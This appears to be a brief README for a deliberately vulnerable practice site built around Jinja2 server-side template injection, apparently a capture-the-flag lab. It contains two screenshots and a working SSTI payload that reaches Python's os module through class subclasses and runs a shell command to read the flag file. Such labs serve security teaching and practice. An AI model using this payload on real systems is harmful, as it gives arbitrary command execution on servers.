This is simple website vulnerabel to jinja2 ssti


![1](https://github.com/user-attachments/assets/8f618ac1-58ff-4248-830c-c70a262b238c)

payload ```{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag").read()}}{%endif%}{% endfor %}```

![Screenshot from 2025-03-18 22-36-24](https://github.com/user-attachments/assets/cb31b531-462f-465f-8d39-e85530a42fd5)
